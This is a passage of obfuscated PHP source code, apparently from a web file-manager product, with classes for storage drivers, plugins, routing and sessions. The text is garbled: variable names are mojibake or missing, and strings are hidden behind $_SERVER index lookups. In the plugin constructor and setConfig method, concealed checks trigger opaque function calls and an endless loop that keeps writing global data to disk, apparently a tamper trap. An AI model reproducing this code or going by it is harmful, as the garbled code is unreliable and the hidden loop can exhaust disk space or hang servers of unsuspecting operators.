$ÿÄ[$“™[452]]; parent::update($ÿÄ[$“™[452]], array($“™[47] => 0)); } } $this->updateBackup($, $Ôí°); } return $∆àÀÖ; } public function add($) { $ÈÜô =& $_SERVER[]; $ = array_to_keyvalue(parent::listData(), $ÈÜô[42]); if (isset($[$[$ÈÜô[42]]])) { return !1; } $this->checkConfig($); $ = parent::insert($); if ($ && $[$ÈÜô[47]]) { foreach ($ as $) { if ($[$ÈÜô[47]]) { parent::update($[$ÈÜô[452]], array($ÈÜô[47] => 0)); } } } return $; } public function updateBackup($, $«û) { $ =& $_SERVER[]; if (!$«û) { return; } $ = Model($[789])->config(); if ($[$[1655]] != $[98] || $[$[791]] != $«û) { return; } $ = Model($[810])->get($[820]); $ = json_decode($, !0); if (!$) { return; } $[$[791]] = $; Model($[810])->set(array($[820] => $)); } public function checkPwd($‘à, &$) { $Ÿª =& $_SERVER[]; if (empty($[$Ÿª[16]])) { return; } $ÓïØ = json_decode($[$Ÿª[16]], !0); $Ãî—ø = $Ÿª[22]; $ = array($Ÿª[2206], $Ÿª[2207], $Ÿª[930]); foreach ($ as $œ†) { if (isset($ÓïØ[$œ†])) { $Ãî—ø = $œ†; break; } } if (!$Ãî—ø) { return; } $Óû† = $this->getConfig($‘à); $«Ä = $Óû†[$Ãî—ø]; $Á∫ü = $ÓïØ[$Ãî—ø]; if ($Á∫ü == str_repeat($Ÿª[213], strlen($«Ä))) { $ÓïØ[$Ãî—ø] = $«Ä; $[$Ÿª[16]] = json_encode($ÓïØ); } else { if ($Á∫ü != $«Ä) { $[$Ÿª[2205]] = $Ÿª[98]; } } } public function checkConfig(&$‰îä, $Ãê = false) { $Ë∏ô =& $_SERVER[]; $⁄û æ = strtolower($‰îä[$Ë∏ô[105]]); $œç = json_decode($‰îä[$Ë∏ô[16]], !0); foreach ($œç as $ => $) { if (is_string($)) { $œç[$] = trim($); } } $œç[$Ë∏ô[2208]] = rand_string(6); $ÿõ = $GLOBALS[$Ë∏ô[16]][$Ë∏ô[99]][$Ë∏ô[866]]; $≈Æ€ì = isset($ÿõ[$⁄û æ]) ? $ÿõ[$⁄û æ] : ucfirst($⁄û æ); $‰ú• = $Ë∏ô[84] . $≈Æ€ì; if (!$≈Æ€ì || !class_exists($‰ú•)) { if ($Ãê) { return LNG($Ë∏ô[2209]); } write_log(array($Ë∏ô[2210], $‰îä, get_caller_info()), $Ë∏ô[2211]); show_json(LNG($Ë∏ô[2209]), !1, $‰îä); } $‘© = new $‰ú•($œç); if (in_array($⁄û æ, $‘©->objectDriver)) { if (!$‘©->isBucketCors() && !$‘©->setBucketCors()) { $◊† = LNG($Ë∏ô[2212]); $◊† .= $Ë∏ô[2213] . LNG($Ë∏ô[2214]); if ($Ãê) { return $◊†; } show_json($◊†, !1); } } $ÀØ = rtrim($œç[$Ë∏ô[1221]], $Ë∏ô[18]) . $Ë∏ô[18]; $ﬂö = $‘©->getPath($ÀØ . $Ë∏ô[1225]); if (!$‘©->mkfile($ﬂö)) { if ($Ãê) { return LNG($Ë∏ô[2212]); } show_json(LNG($Ë∏ô[2212]), !1); } $œç[$Ë∏ô[1221]] = $ÀØ; $‰îä[$Ë∏ô[16]] = json_encode($œç); $‰îä[$Ë∏ô[105]] = $≈Æ€ì; return !0; } public function driverListSystem() { $◊é =& $_SERVER[]; $‘∑€ó = parent::listData(); $ = array(); foreach ($‘∑€ó as $Œú) { unset($Œú[$◊é[225]], $Œú[$◊é[95]]); $Œú[$◊é[16]] = json_decode($Œú[$◊é[16]], !0); $[] = $Œú; } return $; } public function defaultDriver() { $ŸØ„ªô =& $_SERVER[]; $ = parent::listData(); $€≠ = array_filter_by_field($, $ŸØ„ªô[47], 1); $€≠ = $€≠[0]; if ($€≠) { $€≠[$ŸØ„ªô[16]] = json_decode($€≠[$ŸØ„ªô[16]], !0); } return $€≠; } public function driverInfo($) { $À¶’ö =& $_SERVER[]; $ = array_to_keyvalue(parent::listData(), $À¶’ö[452]); if (!isset($[$])) { return !1; } $À∫ = $[$]; $À∫[$À¶’ö[16]] = json_decode($À∫[$À¶’ö[16]], !0); return $À∫; } public function remove($Îöß◊∫) { $this->removeShareItems($Îöß◊∫); return parent::remove($Îöß◊∫); } public function removeWithFile($œ´, $›ø) { $∆ü =& $_SERVER[]; $”†◊∞ = array($∆ü[857] => $œ´); $ = Model($∆ü[521])->where($”†◊∞)->count(); $÷Ñ = Model($∆ü[521])->where($”†◊∞)->sum($∆ü[86]); $ = $›ø . $∆ü[2215] . $œ´; $ = LNG($›ø == $∆ü[597] ? $∆ü[2216] : $∆ü[2217]); $ = new TaskFileTransfer($, $∆ü[2211], $, $ . "\50{$œ´}\51"); $->task[$∆ü[803]] = (double) $÷Ñ; $ ≥À© = KodIO::defaultDriver(); $ = $ ≥À©[$∆ü[452]]; $Îü® = "\x7b\x69\157\72{$}\175\57"; $Õö = !0; $ = array(); $Ôõ® = Model($∆ü[224])->where($”†◊∞)->field($∆ü[2218])->select(); foreach ($Ôõ® as $) { $‹ê = $[$∆ü[94]]; $ = $Îü® . str_replace("\173\x69\157\72{$œ´}\175\x2f", $∆ü[22], $‹ê); if (!IO::exist($‹ê)) { $[] = $[$∆ü[518]]; $->updateFileEnd($[$∆ü[42]], $[$∆ü[86]]); continue; } if (IO::exist($)) { $->updateFileEnd($[$∆ü[42]], $[$∆ü[86]]); continue; } if (!IO::move($‹ê, get_path_father($))) { $Õö = !1; break; } $”†◊∞ = array($∆ü[518] => $[$∆ü[518]]); $Ãâ = array($∆ü[857] => $, $∆ü[94] => $); Model($∆ü[224])->where($”†◊∞)->save($Ãâ); } $this->removeByFileID($); if (!$Õö) { $->stop($); return !1; } $->end(); if ($›ø == $∆ü[1852]) { $this->remove($œ´); } } public function progress($…Ç, $Â¶®) { return Task::get($Â¶® . $_SERVER[][2215] . $…Ç); } private function removeByFileID($“∑ = array()) { $ =& $_SERVER[]; if (empty($“∑)) { return; } $ = array($[518] => array($[17], $“∑)); $ÿî = Model($[1373])->where($)->field($[191])->select(); if (!$ÿî) { return; } $ÿî = array_to_keyvalue($ÿî, $[22], $[191]); foreach ($ÿî as $“è) { Model($[467])->removeNow($“è, !1); } } private function removeShareItems($›£‹Ü) { $◊Ö‹® =& $_SERVER[]; $ = "\x7b\151\157\x3a{$›£‹Ü}\175\57"; $’ó = array($◊Ö‹®[191] => 0, $◊Ö‹®[1216] => array($◊Ö‹®[436], "{$}\x25")); $ = Model($◊Ö‹®[1863])->where($’ó)->field($◊Ö‹®[642])->select(); if (empty($)) { return; } $ÁüÜ = array_to_keyvalue($, $◊Ö‹®[22], $◊Ö‹®[642]); Model($◊Ö‹®[641])->remove($ÁüÜ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\114\x69\147\150\164\x41\160\160"; public $modelType = "\123\171\x73\164\145\x6d\117\x70\x74\151\x6f\156"; public $field = array("\x6e\141\155\145", "\147\162\x6f\165\160", "\x64\x65\x73\143", "\143\157\156\x74\145\x6e\x74"); public function listData($ﬂï√è = false, $Ÿä = "\155\x6f\x64\x69\146\171\124\151\x6d\x65", $–Ö = true) { return parent::listData($ﬂï√è, $Ÿä, $–Ö); } public function remove($‚¶û) { $¬ß·∞¨ = $this->findByName($‚¶û); if (!$¬ß·∞¨) { return !1; } return parent::remove($¬ß·∞¨[$_SERVER[][452]]); } public function add($«ª) { if ($this->findByName($«ª[$_SERVER[][42]])) { return !1; } return parent::insert($«ª); } public function update($, $) { $ =& $_SERVER[]; $ = $this->findByName($); $ﬂü = $this->findByName($[$[42]]); if (!$ || $ﬂü && $ﬂü[$[452]] != $[$[452]]) { return !1; } return parent::update($[$[452]], $); } } goto F≈ô; D–∏: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¬° =& $_SERVER[]; if ($_SERVER[$¬°[6]] != $_SERVER[$¬°[7]]) { $«¢ = $¬°[918]; $ = $¬°[8]; $ﬂ£ = $_SERVER[$¬°[9]] . $¬°[10]; $Àú = $($ﬂ£); $ƒ§ = explode($¬°[11], $Àú); if (count($ƒ§) < $¬°[662]) { $Ÿó = $¬°[13]; $Ÿó(); } $ ñ≈® = $¬°[919]; $ ñ≈®($_SERVER[$¬°[920]]); $ ñ≈®($_SERVER[$¬°[9]] . $¬°[1547]); $ = 1; while ($ > 1) { $ = $ + 4; $Ãó = rawurlencode($ . $¬°[431]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¬°[1548]); $this->pluginName = str_replace($¬°[1548], $¬°[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¬°[18]; $this->pluginApi = appHostGet() . $¬°[1549] . $this->pluginName . $¬°[18]; $this->pluginHost = $config[$¬°[1550]] . $this->pluginName . $¬°[18]; $this->pluginHostDefault = $config[$¬°[1550]] . $this->pluginName . $¬°[18]; $ = $config[$¬°[1551]]; if ($ && strpos($¬°[60] . $ . $¬°[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$¬°[1552]] . $this->pluginName . $¬°[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1553]); } protected function assign($◊â, $ © = false) { if (is_array($◊â)) { $this->values = array_merge($this->values, $◊â); } else { $this->values[$◊â] = $ ©; } } protected function display($) { extract($this->values); require $; } final function hookRegist($≈¢≈∫) { $this->modelPlugin->appRegist($this->pluginName, $≈¢≈∫); } final function appIcon() { $…ø =& $_SERVER[]; $ = $this->appPackage(); $’Ω = $…ø[22]; if (isset($[$…ø[467]])) { if (isset($[$…ø[467]][$…ø[1554]])) { $’Ω = $…ø[1555] . $[$…ø[467]][$…ø[1554]] . $…ø[1556]; } else { if ($[$…ø[467]][$…ø[1557]]) { $’Ω = $…ø[1558] . $[$…ø[467]][$…ø[1557]] . $…ø[1559]; } } } return $’Ω; } final function fileCanView($Íéù…Ü) { $”ü =& $_SERVER[]; if (request_url_safe($Íéù…Ü)) { return !0; } if ($this->isShare($Íéù…Ü)) { return !0; } $‘ì = Session::get($”ü[1560]); if ($GLOBALS[$”ü[545]] != 1 && !$‘ì || !$‘ì[$”ü[1561]]) { $ÁØ™ = $”ü[1562] . rawurlencode(this_url()); show_tips(LNG($”ü[1563]) . $”ü[1564] . $ÁØ™ . $”ü[1565] . LNG($”ü[1566]) . $”ü[1567], !1); } if (!Action($”ü[1568])->authCan($”ü[1569])) { show_tips(LNG($”ü[1570]) . $”ü[1571], !1); } ActionCall($”ü[1572], $Íéù…Ü); } final function isShare($) { $Òì†Ñ = KodIO::parse($); return $Òì†Ñ[$_SERVER[][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($—∑ ´) { if (request_url_safe($—∑ ´)) { return $—∑ ´; } if (!$this->isShare($—∑ ´)) { $—∑ ´ = $this->filePath($—∑ ´, !1); } return Action($_SERVER[][1215])->linkOut($—∑ ´); } public function filePathLinkOut($≈º) { if (request_url_safe($≈º)) { return $≈º; } $this->fileCanView($≈º); return Action($_SERVER[][1215])->link($≈º); } final function filePath($—û, $Œä = true) { $÷∞ =& $_SERVER[]; if ($ = $this->checkSharePath($—û, $Œä)) { Hook::trigger($÷∞[1573], $); return $; } $this->fileCanView($—û); if (request_url_safe($—û)) { $”Ü = parse_url_query($—û); if (isset($”Ü[$÷∞[1574]]) && isset($”Ü[$÷∞[228]])) { $ = Model($÷∞[810])->get($÷∞[811]); $–∞ = Mcrypt::decode($”Ü[$÷∞[228]], $); if ($–∞) { $this->fileInfo = IO::info($–∞); $this->fileInfo[$÷∞[1575]] = $—û; $this->cachePath = $this->pluginCachePath($÷∞[22], $Œä); if (!$this->fileInfo) { show_tips(LNG($÷∞[115]), !1); } Hook::trigger($÷∞[1573], $–∞); return $–∞; } } $—û = $this->_cacheHttpFile($—û, $Œä); $this->fileInfo = IO::info($—û); } else { $this->fileInfo = IO::info($—û); $this->cachePath = $this->pluginCachePath($÷∞[22], $Œä); } if (!$this->fileInfo) { show_tips(LNG($÷∞[115]), !1); } Hook::trigger($÷∞[1573], $—û); return $—û; } final function _cacheHttpFile($÷ã◊ö, $∆òƒ§ = true) { $Ìñá =& $_SERVER[]; $ﬂ† = parse_url_query($÷ã◊ö); $’èÿñ = get_path_ext($÷ã◊ö); if (isset($ﬂ†[$Ìñá[42]]) && $ﬂ†[$Ìñá[42]]) { $’èÿñ = get_path_ext($ﬂ†[$Ìñá[42]]); } $ÂÜõ = hash_path($÷ã◊ö) . $Ìñá[20] . $’èÿñ; $this->cachePath = $this->pluginCachePath($∆òƒ§ ? $ÂÜõ : $Ìñá[22]); $ = IO::fileNameExist($this->cachePath, $ÂÜõ); if ($) { return KodIO::make($); } $œå = rtrim($this->cachePath, $Ìñá[18]) . $Ìñá[18] . $ÂÜõ; return $this->pluginCacheFileSet($œå, file_get_contents_nossl($÷ã◊ö)); } final function checkSharePath($·µá, $ º = true) { $ =& $_SERVER[]; if (!$this->isShare($·µá)) { return !1; } $Êï¨ = Action($[1215])->sharePathInfo($·µá); if (!is_array($Êï¨) || !isset($Êï¨[$[94]])) { show_json(LNG($[1576]), !1); } $this->fileInfo = $Êï¨; $this->cachePath = $this->pluginCachePath(!1, $ º); return $Êï¨[$[94]]; } final function pluginCachePath($∆ö = '', $ = false) { $¬ß =& $_SERVER[]; if ($ && is_array($this->fileInfo)) { $∆ö = kodIO::hashPath($this->fileInfo); } $‘ú◊£ = rtrim(IO_PATH_SYSTEM_TEMP . $¬ß[1577] . $this->pluginName . $¬ß[18] . $∆ö, $¬ß[18]); $≈ô = IO::infoFullSimple($‘ú◊£); $ = $≈ô && is_array($≈ô) ? $≈ô[$¬ß[94]] : $¬ß[22]; if (!$) { $ = IO::mkdir($‘ú◊£); } return $; } final function pluginCacheFileSet($›¢…è, $ = '') { $ƒü⁄© =& $_SERVER[]; $–ì = IO::infoFullSimple($›¢…è); if (!$–ì) { return IO::mkfile($›¢…è, $, REPEAT_REPLACE); } IO::setContent($–ì[$ƒü⁄©[94]], $); return $–ì[$ƒü⁄©[94]]; } final function pluginLocalFile($Óè´ = '') { $Ë¥ü =& $_SERVER[]; $ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($)) { mk_dir($); } if (!$Óè´) { return $; } $‹º¬è = IO::info($Óè´); $ = $Ë¥ü[1578] . KodIO::hashPath($‹º¬è) . $Ë¥ü[20] . $‹º¬è[$Ë¥ü[185]]; if (!checkExtSafe($)) { $ = $ . $Ë¥ü[1247]; } $⁄¶ = $ . $; if (@file_exists($⁄¶)) { return $⁄¶; } return IO::copy($Óè´, $, 0, $); } final function appPackage() { $÷Å =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $ﬁìœπ = $this->parseFile($this->pluginPath . $÷Å[1579]); $this->parseLang($ﬁìœπ); $ÒØõû = json_decode_force($ﬁìœπ); if (!$ÒØõû) { return array(); } $›ò = Hook::trigger($÷Å[1580], $ÒØõû); if ($›ò && is_array($›ò)) { $ÒØõû = $›ò; } $this->packageData = $ÒØõû; return $ÒØõû; } public function packageInfoGet($Ï©ú) { $‹Ñƒî = $this->appPackage(); return array_get_value($‹Ñƒî, $Ï©ú); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1581]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1582]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1583]); } public function echoJsAssign($ÿ≥, $) { $this->echoJsAssignArr[$ÿ≥] = $; } private function parseFile($⁄ö) { $À£ =& $_SERVER[]; $‹ï = file_get_contents_nossl($⁄ö); $‹± = array($À£[1584], $À£[1585], $À£[1586], $À£[1587], $À£[1588], $À£[1589], $À£[1590]); $…≠ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$À£[99]][$À£[1591]]); foreach ($this->echoJsAssignArr as $⁄©’´ => $œ±) { $‹±[] = $À£[1592] . $⁄©’´ . $À£[1593]; $…≠[] = is_array($œ±) || is_object($œ±) ? rawurlencode(json_encode($œ±)) : $œ±; } if (strstr($‹ï, $À£[1594])) { $ = rawurlencode(json_encode($this->pluginLangArr)); $‹ï = str_replace($À£[1594], $, $‹ï); } if (strstr($‹ï, $À£[1595])) { $ = $ = rawurlencode(json_encode($this->getConfig())); $‹ï = str_replace($À£[1595], $, $‹ï); } $‹ï = str_replace($‹±, $…≠, $‹ï); return $‹ï; } private function parseLang(&$) { $Ÿ£ =& $_SERVER[]; $ÃòÕâ = $Ÿ£[1596]; if (!strstr($, $ÃòÕâ)) { return; } preg_match_all($Ÿ£[1597], $, $ﬁå≈∏); if (!is_array($ﬁå≈∏) || count($ﬁå≈∏) == 0 || !is_array($ﬁå≈∏[0]) || count($ﬁå≈∏[0]) == 0) { return; } $“™ = array(); $ÿØ = array(); foreach ($ﬁå≈∏[0] as $–í) { $Ãú = substr($–í, strlen($ÃòÕâ), -4); $Ãµ = LNG($Ãú); $“™[] = $–í; $ÿØ[] = str_replace(array($Ÿ£[11], $Ÿ£[1119], $Ÿ£[395], $Ÿ£[128]), array($Ÿ£[63], $Ÿ£[63], $Ÿ£[22], $Ÿ£[1598]), $Ãµ); } $ = str_replace($“™, $ÿØ, $); } private function parseConfig(&$) { $„êÜ =& $_SERVER[]; $œÑ = $„êÜ[1599]; if (!strstr($, $œÑ)) { return; } preg_match_all($„êÜ[1600], $, $Ëßí·≥Ö); if (!is_array($Ëßí·≥Ö) || count($Ëßí·≥Ö) == 0 || !is_array($Ëßí·≥Ö[0]) || count($Ëßí·≥Ö[0]) == 0) { return; } $Ë°µ = $this->getConfig(); $ = array(); $»É = array(); foreach ($Ëßí·≥Ö[0] as $›π) { $ = substr($›π, strlen($œÑ), -2); $[] = $›π; $»É[] = _get($Ë°µ, $); } $ = str_replace($, $»É, $); } private function parsePackage(&$) { $¬ó =& $_SERVER[]; $ = $¬ó[1601]; if (!strstr($, $)) { return; } preg_match_all($¬ó[1602], $, $‘ë); if (!is_array($‘ë) || count($‘ë) == 0 || !is_array($‘ë[0]) || count($‘ë[0]) == 0) { return; } $’ë…ü = $this->appPackage(); $ = array(); $ÃÇ = array(); foreach ($‘ë[0] as $) { $ = substr($, strlen($), -2); $[] = $; $ÃÇ[] = _get($’ë…ü, $); } $ = str_replace($, $ÃÇ, $); } final function echoFile($€î, $‘ΩÕë = false) { $Ëë∏ =& $_SERVER[]; $ = $this->pluginPath . $€î; if (ACT == $Ëë∏[1603]) { echo $Ëë∏[1604] . $this->pluginName . $Ëë∏[18] . $€î . $Ëë∏[1605]; if (!file_exists($)) { echo $Ëë∏[1606]; return; } } $ = $this->parseFile($); $this->parseLang($); $this->parseConfig($); $this->parsePackage($); if (is_array($‘ΩÕë)) { $ = str_replace(array_keys($‘ΩÕë), array_values($‘ΩÕë), $); } echo $Ëë∏[11] . $; } final function initLang() { $ =& $_SERVER[]; $ÿ° = $[1607]; $‹Çﬁ¨ = $this->pluginPath . $[1608]; $ = I18n::getType(); $ÕòÀ∞ = array(); if (file_exists($‹Çﬁ¨ . $ . $[879])) { $ÕòÀ∞ = (include $‹Çﬁ¨ . $ . $[879]); } else { if ($ == $[1609] && !file_exists($‹Çﬁ¨ . $ . $[879]) && file_exists($‹Çﬁ¨ . $[1610])) { $ÕòÀ∞ = (include $‹Çﬁ¨ . $[1610]); } else { if (file_exists($‹Çﬁ¨ . $ÿ° . $[879])) { $ÕòÀ∞ = (include $‹Çﬁ¨ . $ÿ° . $[879]); } } } if (!is_array($ÕòÀ∞)) { return array(); } if (@count($ÕòÀ∞) > 0) { I18n::set($ÕòÀ∞); } return $ÕòÀ∞; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($) { $Ïõ¨∆∏ =& $_SERVER[]; $‹ë = $_SERVER[$Ïõ¨∆∏[9]] . $Ïõ¨∆∏[10]; $’ã = $Ïõ¨∆∏[917]; if ($_SERVER[$Ïõ¨∆∏[6]] != $’ã($‹ë)) { $»Å⁄µ = $Ïõ¨∆∏[918]; $‰à¨ = $Ïõ¨∆∏[8]; $—Ω = $_SERVER[$Ïõ¨∆∏[9]] . $Ïõ¨∆∏[10]; $ = $‰à¨($—Ω); $·ü¶ = explode($Ïõ¨∆∏[11], $); if (count($·ü¶) < $Ïõ¨∆∏[662]) { $⁄ñ = $Ïõ¨∆∏[13]; $⁄ñ(); } $ = $Ïõ¨∆∏[919]; $($_SERVER[$Ïõ¨∆∏[920]]); $»Å⁄µ = $Ïõ¨∆∏[918]; $»Å⁄µ(); $›è = $Ïõ¨∆∏[921]; $√ú = json_encode($GLOBALS[$Ïõ¨∆∏[922]]); $ƒû„≠† = 1; for ($ = $ƒû„≠†; $ > 0; $++) { $›è(DATA_PATH . $, $√ú); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $); } public function onSetConfig($) { } public function onGetConfig($) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($) { if ($ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($‚Öõ = "\160\154\165\x67\151\x6e\x41\165\164\x68") { $Ôõ∂ =& $_SERVER[]; if (!Session::get($Ôõ∂[1560])) { return !1; } if (_get($GLOBALS, $Ôõ∂[545])) { return !0; } $ = $this->getConfig(); if (!$[$‚Öõ]) { return !1; } return ActionCall($Ôõ∂[1611], $[$‚Öõ]); } public function url($, $≈≠ = '', $”ø = true) { $ =& $_SERVER[]; $…§ = $this->getConfig(); $√Ö = KOD_VERSION . $[20] . KOD_VERSION_BUILD; $ƒìÀí = $this->packageVersion(); $ = $√Ö . $[439] . $ƒìÀí; if (substr($, 0, 4) == $[159] || substr($, 0, 2) == $[1394]) { $’ì = $ . $[1612] . $; } else { if ($≈≠ == $[22]) { $’ì = $this->pluginHost . $ . $[1612] . $; } else { if ($≈≠ === $[85]) { $’ì = $this->pluginHost . $; } else { if ($≈≠ == $[1613]) { $’ì = STATIC_PATH . $ . $[1612] . $√Ö; } else { if ($≈≠ == $[1614]) { $’ì = APP_HOST . $[1615] . $ . $[1612] . $√Ö; } else { if (isset($…§[$≈≠])) { $’ì = $…§[$≈≠] . $ . $[1612] . $; } } } } } } if (!$”ø) { return $’ì; } echo $’ì; } public function link($ = false, $ ∞ = '') { $◊Å =& $_SERVER[]; if (!$) { $this->link($◊Å[1616], $◊Å[1614]); $this->link($◊Å[1617], $◊Å[1613]); $this->link($◊Å[1618], $◊Å[1613]); $this->link($◊Å[1619], $◊Å[1613]); $this->link($◊Å[1620], $◊Å[1613]); return; } $ = $this->url($, $ ∞, !1); if (substr($, -3) == $◊Å[1621]) { echo $◊Å[1622] . $ . $◊Å[1623] . $◊Å[11]; } else { if (substr($, -4) == $◊Å[1624]) { echo $◊Å[1625] . $ . $◊Å[1626] . $◊Å[11]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\x2f\x5d\53", "\x3a\x6e\x75\x6d" => "\133\x30\55\71\x5d\x2b", "\x3a\x61\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($, $) { $∆ö =& $_SERVER[]; if ($ == $∆ö[1627]) { $—ª = array_map($∆ö[1628], $[0]); $ŒàÃï = strpos($[1], $∆ö[18]) === 0 ? $[1] : $∆ö[18] . $[1]; $»Æ‰Öã = $[2]; } else { $—ª = null; $ŒàÃï = strpos($[0], $∆ö[18]) === 0 ? $[0] : $∆ö[18] . $[0]; $»Æ‰Öã = $[1]; } array_push(self::$maps, $—ª); array_push(self::$routes, $ŒàÃï); array_push(self::$methods, strtoupper($)); array_push(self::$callbacks, $»Æ‰Öã); } public static function error($ÊçÆ÷Ω) { self::$errorCallback = $ÊçÆ÷Ω; } public static function haltOnMatch($€Ü◊âÀÄ = true) { self::$halts = $€Ü◊âÀÄ; } public static function dispatch() { $ =& $_SERVER[]; $Œ¢∆¢ = parse_url($_SERVER[$[1629]], PHP_URL_PATH); $ÿã = $_SERVER[$[170]]; $›æ = array_keys(static::$patterns); $€Ω = array_values(static::$patterns); $“•¬ï = !1; self::$routes = preg_replace($[1317], $[18], self::$routes); if (in_array($Œ¢∆¢, self::$routes)) { $¬å = array_keys(self::$routes, $Œ¢∆¢); foreach ($¬å as $) { if (self::$methods[$] == $ÿã || self::$methods[$] == $[1630] || in_array($ÿã, self::$maps[$])) { $“•¬ï = !0; if (!is_object(self::$callbacks[$])) { $‰Ø≥ = explode($[18], self::$callbacks[$]); $„û† = end($‰Ø≥); $ = explode($[1249], $„û†); $ = new $[0](); $->{$[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$]); if (self::$halts) { return; } } } } } else { $Ã™ = 0; foreach (self::$routes as $) { if (strpos($, $[4]) !== !1) { $ = str_replace($›æ, $€Ω, $); } if (preg_match($[1631] . $ . $[1632], $Œ¢∆¢, $)) { if (self::$methods[$Ã™] == $ÿã || self::$methods[$Ã™] == $[1630] || !empty(self::$maps[$Ã™]) && in_array($ÿã, self::$maps[$Ã™])) { $“•¬ï = !0; array_shift($); if (!is_object(self::$callbacks[$Ã™])) { $‰Ø≥ = explode($[18], self::$callbacks[$Ã™]); $„û† = end($‰Ø≥); $ = explode($[1249], $„û†); $ = new $[0](); if (!method_exists($, $[1])) { echo $[1633]; } else { call_user_func_array(array($, $[1]), $); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ã™], $); if (self::$halts) { return; } } } } $Ã™++; } } if ($“•¬ï == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $⁄¶ƒ∞ =& $_SERVER[]; header($_SERVER[$⁄¶ƒ∞[1634]] . $⁄¶ƒ∞[1635]); echo $⁄¶ƒ∞[1636]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$[1629]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¬™”É =& $_SERVER[]; static $√à = false; if ($√à) { return $√à; } $Ÿä = $GLOBALS[$¬™”É[16]][$¬™”É[402]]; self::$sessionTime = $Ÿä[$¬™”É[1637]]; $ÈöÖ = isset($GLOBALS[$¬™”É[1638]]) ? $GLOBALS[$¬™”É[1638]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÈöÖ)) { self::$sessionSign = Cookie::get($ÈöÖ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÈöÖ, self::$sessionSign, self::$sessionTime); $·Å§ = $Ÿä[$¬™”É[1639]]; $Ïïª = $Ÿä[$·Å§]; $ = $Ÿä[$¬™”É[868]]; switch ($·Å§) { case $¬™”É[31]: self::$handle = Model($¬™”É[869]); break; case $¬™”É[870]: self::$handle = new CacheRedis($Ïïª, $); break; case $¬™”É[871]: self::$handle = new CacheMemcached($Ïïª, $); break; case $¬™”É[224]: $Ïïª[$¬™”É[94]] = $Ïïª[$¬™”É[94]] . $¬™”É[1640]; self::$handle = new CacheFile($Ïïª, $); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $√à = new self(); return $√à; } public static function getBySign($Ùéñ∞) { $ﬁÑ = self::$handle->get($Ùéñ∞); $ﬁÑ = unserialize($ﬁÑ); return is_array($ﬁÑ) ? $ﬁÑ : array(); } public static function setBySign($ƒÉ, $–®) { CacheLock::lock($ƒÉ); self::$handle->set($ƒÉ, serialize($–®), self::$sessionTime); CacheLock::unlock($ƒÉ); } public static function sign($Àé = false) { if ($Àé) { self::$sessionSign = $Àé; } self::init(); return self::$sessionSign; } public static function set($, $ = false) { self::init(); if (is_array($)) { foreach ($ as $œû => $√ê) { array_set_value(self::$data, $œû, $√ê); } } else { array_set_value(self::$data, $, $); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ﬂª = false) { self::init(); if (!$ﬂª) { return self::$data; } return array_get_value(self::$data, $ﬂª); } public static function remove($”Ñ) { self::init(); unset(self::$data[$”Ñ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][874])) { self::$handle->clearTimeout(); } } } goto d–æÔ∫è; d: class AnalysisModel extends ModelBaseLight { public function init($”ª) { $ =& $_SERVER[]; $»∫ = array($[639] => array($[43] => $[1812], $[326] => array($[249], $[805], $[1813], $[1814])), $[1815] => array($[43] => $[1816], $[326] => array($[249], $[803], $[1817], $[1818], $[1819]))); if (!isset($»∫[$”ª])) { return !1; } $this->optionType = $»∫[$”ª][$[43]]; $this->field = $»∫[$”ª][$[326]]; return !0; } public function listData($«ö = false, $ = "\155\157\x64\151\146\171\124\151\x6d\145", $ﬁ∑ = false) { return parent::listData($«ö, $, $ﬁ∑); } public function trendList($Ãà) { $Àïﬂ® =& $_SERVER[]; $⁄å = $this->listData(); if ($⁄å) { $ = end($⁄å); $‘è = date($Àïﬂ®[1820], strtotime($Àïﬂ®[1821])); if ($[$Àïﬂ®[249]] == $‘è) { return $⁄å; } $≈¢»∏ = strtotime($[$Àïﬂ®[249]]); } if (!isset($≈¢»∏)) { $ = $Ãà == $Àïﬂ®[639] ? $Àïﬂ®[576] : 